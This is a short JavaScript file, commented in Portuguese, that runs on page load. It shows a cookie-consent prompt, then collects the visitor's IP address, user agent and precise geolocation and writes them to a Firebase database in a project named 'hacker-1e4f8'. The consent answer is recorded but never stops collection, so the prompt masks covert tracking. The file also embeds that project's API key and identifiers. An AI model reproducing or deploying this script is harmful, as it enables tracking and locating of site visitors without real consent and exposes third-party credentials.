// Importação do Firebase SDK usando módulos ES6
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js";

// Configuração do Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBLH6tWC9zC-5Jx0wk8qgKpHyxXoEeqq-Q",
  authDomain: "hacker-1e4f8.firebaseapp.com",
  projectId: "hacker-1e4f8",
  storageBucket: "hacker-1e4f8.appspot.com",
  messagingSenderId: "210768831975",
  appId: "1:210768831975:web:4e38315cfe587368840942",
  measurementId: "G-9EEH5VXT3N",
  databaseURL: "https://hacker-1e4f8-default-rtdb.firebaseio.com"
};

// Inicializando o Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Função para pedir permissão de cookies
function requestCookieConsent() {
  if (!localStorage.getItem("cookiesAccepted")) {
    const consent = confirm("Este site usa cookies para melhorar sua experiência. Você aceita o uso de cookies?");
    if (consent) {
      localStorage.setItem("cookiesAccepted", true);
      console.log("Cookies aceitos");
    } else {
      console.log("Cookies recusados");
    }
  }
}

// Função para capturar o IP do usuário
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Erro ao obter o IP:", error);
    return null;
  }
}

// Função para obter o User Agent
function getUserAgent() {
  return navigator.userAgent;
}

// Função para obter a localização do usuário (usando o Geolocation API)
function getUserLocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
        },
        error => {
          reject(error);
        }
      );
    } else {
      reject(new Error("Geolocation não é suportada neste navegador"));
    }
  });
}

// Função para salvar os dados no Firebase
function saveUserDataToFirebase(ip, cookiesAccepted, userAgent, location) {
  const userId = Date.now(); // Gerando um ID único baseado no tempo
  set(ref(database, 'users/' + userId), {
    ip: ip,
    cookiesAccepted: cookiesAccepted,
    userAgent: userAgent,
    location: location ? `Lat: ${location.latitude}, Long: ${location.longitude}` : 'Localização não disponível',
    timestamp: new Date().toISOString()
  }).then(() => {
    console.log("Dados do usuário salvos com sucesso.");
  }).catch((error) => {
    console.error("Erro ao salvar dados no Firebase:", error);
  });
}

// Função principal para gerenciar a coleta de dados
async function initApp() {
  requestCookieConsent();
  const cookiesAccepted = localStorage.getItem("cookiesAccepted") === "true";
  const userIP = await getUserIP();
  const userAgent = getUserAgent();
  
  try {
    const location = await getUserLocation();
    if (userIP) {
      saveUserDataToFirebase(userIP, cookiesAccepted, userAgent, location);
    }
  } catch (error) {
    console.error("Erro ao obter a localização:", error);
    if (userIP) {
      saveUserDataToFirebase(userIP, cookiesAccepted, userAgent, null); // Salva sem localização
    }
  }
}



// Inicializando o aplicativo quando a página carregar
window.addEventListener("load", initApp);
